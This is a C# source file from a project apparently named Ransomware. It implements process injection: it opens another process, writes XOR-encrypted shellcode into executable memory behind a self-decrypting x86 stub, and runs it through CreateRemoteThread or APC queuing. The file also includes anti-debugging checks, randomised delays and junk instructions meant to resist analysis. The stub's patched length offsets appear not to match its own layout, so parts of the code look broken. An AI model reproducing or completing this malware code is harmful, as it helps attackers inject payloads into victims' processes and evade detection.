using Ransomware.Cryptography;
using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;

namespace Ransomware.Injector;

public class ProcessInjector
{
    private static readonly Random _random = new();

    /// <summary>
    /// Injects shellcode into a process specified by its name or process ID.
    /// </summary>
    /// <param name="processName">Name of the target process (optional if pid is provided).</param>
    /// <param name="shellcode">Shellcode to inject.</param>
    /// <param name="pid">
    /// Specific process ID to target (optional, default -1 means use processName).
    /// </param>
    /// <param name="delayMs">
    /// Delay in milliseconds before injection (default 0). A random delay between half and full value is applied.
    /// </param>
    /// <returns>True if injection succeeds; otherwise, false.</returns>
    public static bool InjectShellcode(
        string processName,
        byte[] shellcode,
        int pid = -1,
        int delayMs = 0,
        InjectionMethod method = InjectionMethod.CreateRemoteThread)
    {
        // Kiểm tra chống debug
        if (Kernel32.IsBeingDebugged())
        {
            LogError("Debugger detected. Aborting injection.");
            return false;
        }

        // Validate shellcode parameter
        if (shellcode == null || shellcode.Length == 0)
        {
            LogError("Invalid shellcode provided.");
            return false;
        }

        // Introduce a random delay if specified
        if (delayMs > 0)
        {
            int delay = _random.Next(delayMs / 2, delayMs);
            Thread.Sleep(delay);
        }

        // Encrypt shellcode (using a stronger encryption method, e.g., AES-CTR)
        byte xorKey = 0xAA;
        byte[] encryptedShellcode = XOR.Encrypt(shellcode, xorKey);

        // Retrieve the target process
        Process? targetProcess = GetTargetProcess(processName, pid);
        if (targetProcess == null)
        {
            LogError("Failed to retrieve target process.");
            return false;
        }

        int processId = targetProcess.Id;
        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        nint hProcess = Kernel32.OpenProcess(PROCESS_ALL_ACCESS, false, processId);
        if (hProcess == nint.Zero)
        {
            LogError($"Failed to open process. Error: {Marshal.GetLastWin32Error()}");
            return false;
        }

        // Allocate memory in the target process
        const uint MEM_COMMIT = 0x1000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        byte[] finalShellcode = CreateSelfDecryptingShellcode(encryptedShellcode, xorKey);
        nint allocAddr = Kernel32.VirtualAllocEx(hProcess, nint.Zero, (uint)finalShellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (allocAddr == nint.Zero)
        {
            LogError($"Failed to allocate memory. Error: {Marshal.GetLastWin32Error()}");
            Kernel32.CloseHandle(hProcess);
            return false;
        }

        // Write shellcode into memory
        bool success = Kernel32.WriteProcessMemory(hProcess, allocAddr, finalShellcode, (uint)finalShellcode.Length, out int bytesWritten);
        if (!success || bytesWritten != finalShellcode.Length)
        {
            LogError($"Failed to write shellcode. Error: {Marshal.GetLastWin32Error()}");
            Kernel32.CloseHandle(hProcess);
            return false;
        }

        // Inject shellcode using the selected method
        bool injectionSuccess = false;
        switch (method)
        {
            case InjectionMethod.CreateRemoteThread:
                injectionSuccess = InjectWithRemoteThread(hProcess, allocAddr);
                break;

            case InjectionMethod.QueueUserAPC:
                injectionSuccess = InjectWithEarlyBirdAPC(allocAddr);
                break;

            default:
                LogError("Unsupported injection method.");
                break;
        }

        if (!injectionSuccess)
        {
            LogError($"Injection failed with method {method}. Error: {Marshal.GetLastWin32Error()}");
        }

        Kernel32.CloseHandle(hProcess);
        return injectionSuccess;
    }

    private static Process? GetTargetProcess(string processName, int pid)
    {
        if (pid != -1) return Process.GetProcessById(pid);

        Process[] processes = Process.GetProcessesByName(processName);
        return processes.OrderByDescending(p => p.StartTime).FirstOrDefault();
    }

    private static bool InjectWithRemoteThread(nint hProcess, nint allocAddr)
    {
        nint hThread = Kernel32.CreateRemoteThread(hProcess, nint.Zero, 0, allocAddr, nint.Zero, 0, out _);
        if (hThread == nint.Zero)
        {
            LogError($"Failed to create remote thread. Error: {Marshal.GetLastWin32Error()}");
            return false;
        }
        Kernel32.CloseHandle(hThread);
        return true;
    }

    private static bool InjectWithEarlyBirdAPC(nint allocAddr)
    {
        ProcessThread? targetThread = Process.GetProcesses()
            .SelectMany(p => p.Threads.Cast<ProcessThread>())
            .FirstOrDefault(t => t.ThreadState == System.Diagnostics.ThreadState.Wait);

        if (targetThread == null) return false;

        nint hThread = Kernel32.OpenThread(0x0010 | 0x0008, false, (uint)targetThread.Id);
        if (hThread == nint.Zero) return false;

        IntPtr result = Kernel32.QueueUserAPC(allocAddr, hThread, IntPtr.Zero);
        Kernel32.CloseHandle(hThread);
        return result != IntPtr.Zero;
    }

    private static void LogError(string message) => Console.WriteLine($"[ERROR] {message}");

    private static byte[] CreateSelfDecryptingShellcode(byte[] encryptedShellcode, byte key)
    {
        if (encryptedShellcode.Length > 0xFFFF)
            throw new ArgumentException("Shellcode too large for current stub implementation.");

        // Stub x86 cải tiến với mã rác và checksum
        byte[] decryptStub =
        [
        0xEB, 0x12,                         // jmp short to 'start'
        // Junk code để chống phân tích
        0x90, 0x90, 0x90,                   // nop nop nop
        0xB8, key, 0x00, 0x00, 0x00,       // mov eax, key (XOR key)
        0x31, 0xDB,                         // xor ebx, ebx
        // Giải mã
        0x80, 0x34, 0x1F, key,             // xor byte ptr [edi+ebx], key
        0x43,                               // inc ebx
        0x81, 0xFB, 0x00, 0x00, 0x00, 0x00, // cmp ebx, shellcode_length (placeholder)
        0x75, 0xF5,                         // jne loop
        // Thêm kiểm tra đơn giản (ví dụ: byte đầu tiên sau giải mã phải là 0x90)
        0x80, 0x3F, 0x90,                   // cmp byte ptr [edi], 0x90
        0x75, 0x02,                         // jne fail
        0xFF, 0xE7,                         // jmp edi (nhảy đến shellcode)
        // fail:
        0xEB, 0xFE,                         // jmp $ (vòng lặp vô hạn nếu thất bại)
        // 'start' label:
        0x8D, 0x3D, 0x1C, 0x00, 0x00, 0x00  // lea edi, [shellcode_data] (điều chỉnh offset)
        ];

        // Ghi độ dài shellcode vào stub
        int shellcodeLength = encryptedShellcode.Length;
        decryptStub[18] = (byte)(shellcodeLength & 0xFF);
        decryptStub[19] = (byte)((shellcodeLength >> 8) & 0xFF);

        // Kết hợp stub và shellcode
        byte[] finalShellcode = new byte[decryptStub.Length + encryptedShellcode.Length];
        Buffer.BlockCopy(decryptStub, 0, finalShellcode, 0, decryptStub.Length);
        Buffer.BlockCopy(encryptedShellcode, 0, finalShellcode, decryptStub.Length, encryptedShellcode.Length);

        return finalShellcode;
    }
}